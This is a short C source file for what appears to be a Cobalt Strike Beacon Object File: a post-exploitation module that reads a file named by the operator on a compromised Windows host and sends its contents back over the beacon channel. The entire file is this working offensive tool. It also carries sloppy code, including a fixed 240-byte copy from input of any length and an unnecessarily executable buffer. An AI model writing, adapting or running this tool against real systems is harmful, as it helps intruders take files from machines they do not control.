#include <windows.h>
#include <stdio.h>
#include "beacon.h"

#define BUFFERSIZE 20000

LPCSTR conv(LPCSTR aString) {
	    return aString;
}

void go(char* argc, int len)
{
	WINBASEAPI DWORD WINAPI KERNEL32$GetLastError();
	WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
	WINBASEAPI BOOL WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
	WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
	WINBASEAPI BOOL WINAPI KERNEL32$VirtualFree(LPVOID, SIZE_T, DWORD);
	WINBASEAPI BOOL WINAPI KERNEL32$CloseHandle(HANDLE);

	datap parser;
	BeaconDataParse(&parser, argc, len);
	CHAR * fileName;
	HANDLE hFile = NULL;
    	LPVOID ReadBuffer = KERNEL32$VirtualAlloc(NULL, BUFFERSIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	fileName = BeaconDataExtract(&parser, NULL);
	
	CHAR target[240] = { 0 };

    	for (int i = 0; i < 240; i++) {
        	target[i] = fileName[i];
    	}
    	LPCSTR lpName = conv(target);    
	BeaconPrintf(CALLBACK_OUTPUT, "[+] Opening %s\n", lpName);

	hFile = KERNEL32$CreateFileA(lpName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_TEMPORARY, NULL);
	
	if (hFile != -1){
		BeaconPrintf(CALLBACK_OUTPUT, "[+] Got a file Handle: 0x%x\n", hFile);
		KERNEL32$ReadFile(hFile, ReadBuffer, BUFFERSIZE-1, 0, NULL);
		BeaconPrintf(CALLBACK_OUTPUT, "%s", ReadBuffer);
		KERNEL32$CloseHandle(hFile);
		KERNEL32$VirtualFree(ReadBuffer, BUFFERSIZE, MEM_DECOMMIT);
	}
	else
	{
		BeaconPrintf(CALLBACK_ERROR, "Error Opening File: %d\n", KERNEL32$GetLastError());
	}
	
}
